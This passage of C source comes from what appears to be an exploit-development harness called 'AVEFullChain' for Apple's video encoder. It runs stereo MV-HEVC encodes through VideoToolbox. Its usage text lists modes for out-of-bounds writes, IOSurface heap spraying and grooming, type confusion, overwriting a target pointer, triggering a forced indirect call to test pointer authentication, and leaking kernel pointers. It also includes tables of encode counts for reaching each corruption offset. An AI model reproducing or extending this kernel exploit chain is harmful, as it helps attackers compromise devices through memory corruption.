                CFRelease(iosurf); CFRelease(attrs);
            }
            rlog("Left PB: %p, Right PB: %p\n", (void*)pb_left, (void*)pb_right);

            if (pb_left && pb_right) {
                /* Fill left Y plane with 0x40, right with 0x80 */
                CVPixelBufferLockBaseAddress(pb_left, 0);
                void *ly = CVPixelBufferGetBaseAddressOfPlane(pb_left, 0);
                void *luv = CVPixelBufferGetBaseAddressOfPlane(pb_left, 1);
                if (ly) memset(ly, 0x40, CVPixelBufferGetBytesPerRowOfPlane(pb_left, 0) * 1080);
                if (luv) memset(luv, 128, CVPixelBufferGetBytesPerRowOfPlane(pb_left, 1) * 540);
                CVPixelBufferUnlockBaseAddress(pb_left, 0);

                CVPixelBufferLockBaseAddress(pb_right, 0);
                void *ry = CVPixelBufferGetBaseAddressOfPlane(pb_right, 0);
                void *ruv = CVPixelBufferGetBaseAddressOfPlane(pb_right, 1);
                if (ry) memset(ry, 0x80, CVPixelBufferGetBytesPerRowOfPlane(pb_right, 0) * 1080);
                if (ruv) memset(ruv, 128, CVPixelBufferGetBytesPerRowOfPlane(pb_right, 1) * 540);
                CVPixelBufferUnlockBaseAddress(pb_right, 0);

                /* Build CMTaggedBufferGroup */
                CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
                CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
                CMTagCollectionRef ltc = NULL;
                CMTagCollectionCreate(NULL, left_tags, 2, &ltc);

                CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
                CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
                CMTagCollectionRef rtc = NULL;
                CMTagCollectionCreate(NULL, right_tags, 2, &rtc);

                CMTagCollectionRef tcs[2] = { ltc, rtc };
                CVPixelBufferRef pbs[2] = { pb_left, pb_right };
                CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
                CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
                CMTaggedBufferGroupRef tbg = NULL;
                OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
                rlog("TBG create: %d\n", (int)tbg_st);
                CFRelease(tc_arr); CFRelease(pb_arr);

                if (tbg_st == 0 && tbg) {
                    g_encode_done = 0; g_cb_status = -999; g_cb_count = 0;
                    VTEncodeInfoFlags fi = 0;
                    CMTime pts = CMTimeMake(0, 30);
                    CMTime dur = CMTimeMake(1, 30);
                    OSStatus enc = VTCompressionSessionEncodeMultiImageFrame(
                        s, tbg, pts, dur, NULL, NULL, &fi);
                    rlog("EncodeMultiImage: %d, flags=%u\n", (int)enc, (unsigned)fi);

                    if (enc == 0) {
                        for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                        rlog("Poll: done=%d, status=%d, cb=%d, pset=%zu, bytes=%zu\n",
                             g_encode_done, (int)g_cb_status, g_cb_count,
                             g_last_pset_count, g_last_pset_total_bytes);
                        if (!g_encode_done) {
                            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                            for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                            rlog("After flush: done=%d, status=%d, pset=%zu\n",
                                 g_encode_done, (int)g_cb_status, g_last_pset_count);
                        }
                        if (g_encode_done && g_cb_status == 0) {
                            rlog("\n*** MV-HEVC ENCODE SUCCESS! pset=%zu bytes=%zu ***\n",
                                 g_last_pset_count, g_last_pset_total_bytes);
                        } else {
                            rlog("\nEncode failed: status=%d\n", (int)g_cb_status);
                            rlog("Trying second frame in case first always fails...\n");
                            g_encode_done = 0; g_cb_status = -999;
                            CMTime pts2 = CMTimeMake(1, 30);
                            enc = VTCompressionSessionEncodeMultiImageFrame(
                                s, tbg, pts2, dur, NULL, NULL, &fi);
                            rlog("Second EncodeMultiImage: %d\n", (int)enc);
                            if (enc == 0) {
                                for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                                rlog("Poll2: done=%d, status=%d, cb=%d, pset=%zu\n",
                                     g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                            }
                        }
                    }
                    CFRelease(tbg);
                }
                CFRelease(ltc); CFRelease(rtc);
            }
            if (pb_left) CVPixelBufferRelease(pb_left);
            if (pb_right) CVPixelBufferRelease(pb_right);
        }
        VTCompressionSessionInvalidate(s); CFRelease(s);

    } else {
        rlog("Usage: AVEFullChain <mode> [args]\n\n");
        rlog("Modes:\n");
        rlog("  quick      -- Phases 1-3: verify + measure + 100 encodes\n");
        rlog("  standard   -- Phases 1-4: + 250 encodes + OOB read test\n");
        rlog("  full       -- All 6 phases: complete chain test\n");
        rlog("  blraa      -- Firmware with lid=1 (WILL PANIC if PAC fails!)\n");
        rlog("  read_only  -- OOB read only (400 encodes)\n");
        rlog("  spray      -- IOSurface spray + cross-buffer (400 encodes)\n");
        rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
        rlog("  table2_heap [enc] [lid] -- Table 2 OOB + IOSurface spray test\n");
        rlog("  crash_test [lid]     -- Incremental approach to +0x5C70 crash boundary\n");
        rlog("  type_confusion [enc] -- 215 enc, layer_id=2 → value==2 dispatch path\n");
        rlog("  blraa_boundary [lid] -- 213 encodes, stop BEFORE BLRAA trigger at 642\n");
        rlog("  safe_max [lid]   -- Maximum safe encodes (196) before crash\n");
        rlog("  simd_target -- Target entries #630-633 (56-byte SIMD overwrite)\n");
        rlog("  simd_safe [lid]  -- 210 encodes, stop BEFORE SIMD overwrite\n");
        rlog("  cumsum_predict   -- Measure NAL sizes, predict cumsum at entry 601\n");
        rlog("  dual             -- Multi-session spray + cross-buffer + victim trigger\n");
        rlog("  pset_dump [enc]  -- Dump raw parameter set bytes for kernel pointer leak\n");
        rlog("  session_reuse [lid] [rounds] -- Test kalloc_data stale counter reuse\n");
        rlog("  safe_corrupt [lid] [enc]     -- Safe-window +0x5C34 corruption (max 197 enc)\n");
        rlog("  session_reuse_groom [lid] [dummies] -- Stale counter with heap grooming\n");
        rlog("  stereo_overflow [enc] [lid] -- MV-HEVC stereo overflow (default 100 enc, lid=1)\n");
        rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
        rlog("\nKey entry thresholds (TABLE 1):\n");
        rlog("  256 (~86 enc):  First OOB write\n");
        rlog("  588 (~196 enc): Firmware param array start +0x5C34\n");
        rlog("  592 (~197 enc): +0x5C70 TARGET POINTER — CRASH BOUNDARY\n");
        rlog("  601 (~200 enc): +0x5C88 cumsum corrupts SIMD target pointer\n");
        rlog("  630 (~210 enc): +0x5ED4 SIMD source (56-byte header overwrite)\n");
        rlog("  642 (~214 enc): +0x5F94 BLRAA trigger (forced indirect call)\n");
        rlog("  *** Entries 593+ UNREACHABLE from table 1 without crash ***\n");
        rlog("\nKey entry thresholds (TABLE 2):\n");
        rlog("  256 (~86 enc):  First OOB write (intra-buffer, 53 driver fields)\n");
        rlog("  466 (~155 enc): Past buffer content (into alloc padding)\n");
        rlog("  1057 (~352 enc): Past allocation end (UNREACHABLE, crash at 197)\n");
    }

done:
    rlog("\n=== Full chain probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
